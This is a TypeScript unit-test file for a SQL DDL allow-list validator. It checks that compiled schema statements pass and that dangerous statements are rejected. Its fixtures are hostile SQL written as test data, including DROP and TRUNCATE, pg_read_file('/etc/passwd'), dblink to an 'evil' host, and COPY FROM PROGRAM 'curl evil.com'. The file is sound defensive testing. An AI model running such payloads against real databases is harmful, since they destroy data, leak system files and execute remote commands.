// Unit tests for the DDL allow-list (docs/design.md §3.6.5,
// docs/research-receipts.md §10, SK-HDC-006). Tests use hand-crafted
// SQL strings so the validator is exercised independently of the
// compiler — a regression in `db-create/compile-ddl.ts` cannot mask a
// regression here, and vice versa.
//
// The one exception: the `accepts the output of a real compileDdl run`
// case is the integration smoke test that ensures the two halves
// agree. Everything else is pure validator coverage.

import type { SchemaPlan } from "@nlqdb/db/types";
import { describe, expect, it } from "vitest";
import { compileDdl } from "../db-create/compile-ddl.ts";
import { validateCompiledDdl } from "./sql-validate-ddl.ts";

describe("validateCompiledDdl", () => {
  it("accepts the output of a real compileDdl run", () => {
    const plan: SchemaPlan = {
      slug_hint: "test_plan",
      description: "test plan",
      tables: [
        {
          name: "customers",
          description: "test table",
          columns: [
            { name: "id", type: "uuid", nullable: false, description: "test col" },
            { name: "email", type: "text", nullable: false, description: "test col" },
          ],
          primary_key: ["id"],
        },
        {
          name: "orders",
          description: "test table",
          columns: [
            { name: "id", type: "uuid", nullable: false, description: "test col" },
            { name: "customer_id", type: "uuid", nullable: false, description: "test col" },
          ],
          primary_key: ["id"],
        },
      ],
      foreign_keys: [
        {
          from_table: "orders",
          from_columns: ["customer_id"],
          to_table: "customers",
          to_columns: ["id"],
          on_delete: "cascade",
        },
      ],
      metrics: [],
      dimensions: [],
      sample_rows: [],
    };
    const compiled = compileDdl(plan, "tenant_smoke");
    if (!compiled.ok) throw new Error(`compile failed: ${compiled.reason}`);
    expect(validateCompiledDdl(compiled.statements)).toEqual({ ok: true });
  });

  it("accepts hand-crafted CREATE TABLE / CREATE INDEX / ALTER ADD CONSTRAINT", () => {
    expect(
      validateCompiledDdl([
        `CREATE SCHEMA "s";`,
        `CREATE TABLE "s"."t" ("id" UUID NOT NULL, PRIMARY KEY ("id"));`,
        `CREATE INDEX "idx_t_id" ON "s"."t" ("id");`,
        `ALTER TABLE "s"."t" ADD CONSTRAINT "fk_x" FOREIGN KEY ("id") REFERENCES "s"."t" ("id");`,
      ]),
    ).toEqual({ ok: true });
  });

  it("rejects garbage input as parse_failed", () => {
    const result = validateCompiledDdl(["this is not sql"]);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("parse_failed");
  });

  it("rejects DROP buried in a CTE as destructive_verb", () => {
    const result = validateCompiledDdl([
      `WITH x AS (DELETE FROM foo RETURNING *) SELECT 1;`,
      `DROP TABLE evil;`,
    ]);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.reason).toBe("destructive_verb");
      expect(result.statement).toBe(`DROP TABLE evil;`);
    }
  });

  it("rejects TRUNCATE as destructive_verb", () => {
    const result = validateCompiledDdl([`TRUNCATE TABLE foo;`]);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("destructive_verb");
  });

  it("rejects GRANT / REVOKE as destructive_verb", () => {
    expect(validateCompiledDdl([`GRANT SELECT ON foo TO bar;`])).toMatchObject({
      ok: false,
      reason: "destructive_verb",
    });
    expect(validateCompiledDdl([`REVOKE ALL ON foo FROM bar;`])).toMatchObject({
      ok: false,
      reason: "destructive_verb",
    });
  });

  it("rejects ALTER ... DROP COLUMN as destructive_verb", () => {
    const result = validateCompiledDdl([`ALTER TABLE foo DROP COLUMN bar;`]);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("destructive_verb");
  });

  it("rejects ALTER ... ADD CHECK (non-FK) as destructive_verb", () => {
    // Our compiler only emits ADD CONSTRAINT for FK; everything else
    // should surface as a regression.
    const result = validateCompiledDdl([`ALTER TABLE foo ADD CONSTRAINT chk_x CHECK (1 = 1);`]);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("destructive_verb");
  });

  it("rejects pg_catalog references as system_schema_ref", () => {
    const result = validateCompiledDdl([`SELECT * FROM pg_catalog.pg_class;`]);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("system_schema_ref");
  });

  it("rejects information_schema references as system_schema_ref", () => {
    const result = validateCompiledDdl([`SELECT * FROM information_schema.tables;`]);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("system_schema_ref");
  });

  it("rejects pg_sleep as side_effect_function", () => {
    const result = validateCompiledDdl([`SELECT pg_sleep(1);`]);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("side_effect_function");
  });

  it("rejects dblink calls as side_effect_function", () => {
    const result = validateCompiledDdl([
      `SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(x int);`,
    ]);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("side_effect_function");
  });

  it("rejects pg_read_file as side_effect_function", () => {
    const result = validateCompiledDdl([`SELECT pg_read_file('/etc/passwd');`]);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("side_effect_function");
  });

  it("rejects COPY ... FROM PROGRAM as side_effect_function", () => {
    const result = validateCompiledDdl([`COPY foo FROM PROGRAM 'curl evil.com';`]);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("side_effect_function");
  });
});
